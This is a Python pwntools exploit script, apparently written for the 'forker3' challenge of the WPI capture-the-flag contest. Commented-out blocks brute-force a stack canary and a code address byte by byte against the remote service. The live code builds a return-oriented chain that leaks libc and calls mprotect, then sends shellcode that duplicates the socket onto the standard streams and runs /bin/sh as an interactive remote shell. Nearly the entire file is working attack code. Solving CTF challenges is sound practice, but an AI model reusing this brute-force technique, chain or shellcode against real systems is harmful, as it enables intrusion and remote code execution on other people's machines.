from pwn import *

#r = remote("localhost",31337)
context.arch = "amd64"
context.log_level= "error"

"""
secret = "\x00"
for j in range(7):
	print hex(u64(secret.ljust(8,'\x00')))
	for i in range(256):
		print i
		if  i == 0x0a:
			continue
		r = remote("forker3.wpictf.xyz",31339)
		payload = "\x00"*0x48+secret+chr(i)
		r.recvline()
		r.sendline(payload)
		try:
			r.recvuntil("You")
		except:
			r.close()
			continue
		secret+=chr(i)
		r.close()
		break

print hex(u64(secret))
"""
"""
secret = 0x3217923f8eb300
text = "\xf1"

for i in range(0x10):
	print i
	r = remote("forker3.wpictf.xyz",31339)
	payload = "\x00"*0x48+p64(secret)+p64(0x4)*0x5+text+chr(i*0x10+9)
	r.recvline()
	r.sendline(payload)
	try:
		r.recvuntil("You")
	except:
		r.close()
		continue
	text+=chr(i*0x10+9)
	r.close()
	break


for j in range(4):
        print hex(u64(text.ljust(8,'\x00')))
        for i in range(256):
		print i
                if  i == 0x0a:
                        continue
                r = remote("forker3.wpictf.xyz",31339)
                payload = "\x00"*0x48+p64(secret)+p64(0x4)*0x5+text+chr(i)
                r.recvline()
                r.sendline(payload)
                try:
                        r.recvuntil("You")
                except:
                        r.close()
                        continue
                text+=chr(i)
                r.close()
                break
print hex(u64(text.ljust(8,'\x00')))
"""

secret = 0x3217923f8eb300
text = 0x5578905209f1-0x9f1
shellcode = asm("""
xor rax,rax
mov al,0x4
push rax
pop rdi
mov al,0x0
push rax
pop rsi
mov al,0x21
syscall
xor rax,rax
mov al,0x4
push rax
pop rdi
mov al,0x1
push rax
pop rsi
mov al,0x21
syscall
mov al,0x4
push rax
pop rdi
mov al,0x2
push rax
pop rsi
mov al,0x21
syscall
xor rdx,rdx
xor rsi,rsi
mov rdi,0x0068732f6e69622f
push rdi
mov rdi,rsp
xor rax,rax
mov al,0x3b
syscall
""")


#r = remote("localhost",31337)
r = remote("forker3.wpictf.xyz", 31339)
payload = "\x00"*0x48+p64(secret)+"\x00"*0x28
payload += flat([text+0xc8a,0x0,0x1,text+0x202038,0x4,text+0x202038,0x0,text+0xc70])
payload += flat([0x0,0x0,0x1,text+0x202040,0x4,text+0x202300,len(shellcode),text+0xc70])
payload += flat([0x0,0x0,0x1,text+0x202040,0x4,text+0x202060,0x7,text+0xc70])
payload += flat([0x0]*0x7,[text+0xc93,text+0x202000,text+0xc91,0x1000,0x0,text+0x8a0,text+0x202300])

print ("\x0a" in payload)
r.recvline()


r.sendline(payload)
r.recvuntil(":")
libc = u64(r.recvn(6).ljust(8,'\x00'))-0x5d090

print hex(libc)
mprotect = libc+0x10ed40
r.send(shellcode)
r.send(p64(mprotect)[:-1])
r.interactive()




